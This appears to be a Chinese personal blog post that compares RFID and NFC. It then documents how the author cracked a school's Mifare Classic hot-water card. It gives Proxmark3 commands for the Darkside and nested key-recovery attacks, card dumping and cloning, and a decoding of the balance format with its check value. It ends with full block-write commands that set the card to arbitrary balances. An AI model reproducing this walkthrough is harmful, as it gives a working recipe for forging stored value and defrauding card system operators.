---
title: RFID小测试
date: 2016-10-19 13:58:44
tags: Hack
---

偶然看到FreeBuf上的关于RFID（Radio Frequency Identification）的文章，简单做了下笔记后......
首先要说的是容易被混淆的概念：RFID和NFC
**RFID:**
　RFID是射频识别技术，它主要是通过无线电讯号识别特定目标，并可读写数据，但仅仅是单向的读取。RFID有低频（几mm的传输距离）、高频（13.56Mhz）、超高频、微波频段等，频段不同，导致功率不同，导致传输的距离不同。

**NFC:**
　NFC是近距离无线通讯技术，芯片具有相互通信能力，并有计算能力。NFC可以看作是RFID的子集，用的是RFID的高频（13.56MHz）的标准，但却是双向过程。

**结论**：
>NFC ∈ RFID

**安全性对比：**
>在一些设计现金支付、信用卡的应用中，RFID的通信距离情况下，其他设备也可以收到个人RFID信息，存在不安全因素；而NFC工作有效距离约10cm，所以具有很高的安全性


<!--more-->

**一图胜千言：**
![RFID与NFC对比](https://of4jd0bcc.qnssl.com/Rfid/RFID_NFC.jpg)

</br>

**破解分析：**
![mifare芯片结构图](https://of4jd0bcc.qnssl.com/Rfid/mifare%20classic%E8%8A%AF%E7%89%87%E7%BB%93%E6%9E%84%E5%9B%BE.png)
![mifare扇区块](https://of4jd0bcc.qnssl.com/Rfid/%E6%89%87%E5%8C%BA%E5%9D%97.png)
</ul>

可以看到M1卡的内部结构如上图所示
Mifare Classic card提供1k-4k的容量，我们经常见到的是Mifare Classic 1k(S50)，也就是所谓的M1卡。M1卡有从0到15共16个扇区，并且每个扇区都有独立的密码，每个扇区配备了从0到3共4个段，每个段可以保存16字节的内容。0扇区不建议更改是因为储存了制造商的机器检验信息。

所以我们的目标就是剩下的15个储存金额数据的信息的扇区

**破解方式:**
1.使用默认的密码攻击(弱密和初始密码永远都是第一位)
2.nested authentication(验证漏洞攻击，多用于已知某一扇区密码后碰撞出其他扇区的密码)
3.darkside攻击:(PM3神器啊)

**实战:**

**APK：Mifare Classic Tool**
支持设备：

更多设备看这里:
[http://www.shopnfc.it/en/content/7-nfc-device-compatibility](http://www.shopnfc.it/en/content/7-nfc-device-compatibility)

某Evilmass天真的抱着吾等学校的热水卡密码一定是12个f或者12个0的想法(●'◡'●)，购入了一台ACR122U    ￥125

</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>

然后就出二手了    ￥100

(╯°口°)╯︵┴─┴
鉴于原版PM3太贵，那还是买个好(山)看(寨)点的吧

说到底还是穷
(╯°口°)╯︵┴─┴
就是这货:
![PM3Device](https://of4jd0bcc.qnssl.com/Rfid/PM3.jpg)

**操作界面:**
![PM3Client](https://of4jd0bcc.qnssl.com/Rfid/pm3Client.jpg)

命令行输入:`hf mf mifare`进行Darkside Attack拿到密码

**用得到的密码继续输入：**`hf mf nested 1 0 A 1986527***   d`

**利用Nested碰撞出其他扇区密码**
![hf mf](https://of4jd0bcc.qnssl.com/Rfid/dump1.jpg)

获取水卡dumpdata.bin: `hf mf dump 1`
**Dump后拿到数据对白卡进行复制:** `hf mf restore 1`
![水卡复制](https://of4jd0bcc.qnssl.com/Rfid/copy2.jpg)

![白卡复制](https://of4jd0bcc.qnssl.com/Rfid/copy1.jpg)
成功~

然而我们的最终目标是修改金额(手动斜眼←_←)
分析金额变动数据:
**软件:UltraCompare**
![UltraCompare](https://of4jd0bcc.qnssl.com/Rfid/compare.jpg)
第一次的金额是31.62
第二次的金额是31.52
第三次的金额是31.07
第四次的金额是29.77

**整理如下:**
> 5A0C 0000 A5F3 FFFF 5A0C 000011EE11EE 
> 5A0C 0000 A5F3 FFFF 5A0C 000012ED12ED——————31.62 
> 
> 500C 0000 AFF3 FFFF 500C 000011EE11EE
> 500C 0000 AFF3 FFFF 500C 000012ED12ED——————31.52 
> 
> 230C 0000 DCF3 FFFF 230C 000011EE11EE
> 230C 0000 DCF3 FFFF 230C 000012ED12ED——————31.07  
> 
> A10B 0000 5EF4 FFFF A10B 000011EE11EE  
> A10B 0000 5EF4 FFFF A10B 000012ED12ED——————29.77

经测试:最后的11EE和12ED只是单纯的补正为FF而已
即

_————>F_
**所以决定金额的就是 5A0C 和 A5F3**
这里感谢黑手党群里的Feng大神给了个重要的信息：3162(10进制金额)转换为16进制正好是0C5A，上面需要倒序输入
那么后面的A5F3是否为校检位呢---->Bingo!

_————>F_
那么剩下就是修改金额数据了:
比如：

> 520.13
> ————————>16进制
> ————————>CB2D
> ————————>倒序2DCB
> ————————>校检位D234

执行数据块写入
17行:
`hf mf wrbl 17 A 1986527*** 2DCB0000D234FFFF2DCB000011EE11EE`
18行:
`hf mf wrbl 18 A 1986527*** 2DCB0000D234FFFF2DCB000012ED12ED`
DONE~
![52013](https://of4jd0bcc.qnssl.com/Rfid/52013.jpg)

同理修改为655.25
![65525](https://of4jd0bcc.qnssl.com/Rfid/65525.jpg)
至此，总算告一段落了~

Q1：数学不好(比如我)，搞不定金额计算方式怎么办？
A1：复制什么的。或者找个数学好的宿友（Special Thanks To某贤同学）

Q2：整个过程用了多久？
A2:一个星期，计算用了5天૮(༼༼Ծ◞◟Ծ༽༽)ა，所以大家一定要好好学数学

Q3:能不能教我破解热水卡？能不能把这个卖给我？能不能。。。。。。
A3：不约!


<br><br>
> **这个打赏二维码好像有什么不对**

**支付宝** 
![alipay][99]

**微信**  
![wechat][100]


  [99]: https://of4jd0bcc.qnssl.com/Blog/%E6%89%93%E8%B5%8F/alipay/%E9%85%9A%E9%85%9E%E7%93%9C%E6%95%B2%E7%A2%97_alipay.gif?imageView2/1/w/200/h/200
  [100]: https://of4jd0bcc.qnssl.com/Blog/%E6%89%93%E8%B5%8F/wechat/girl_wechat.gif?imageView2/1/w/200/h/200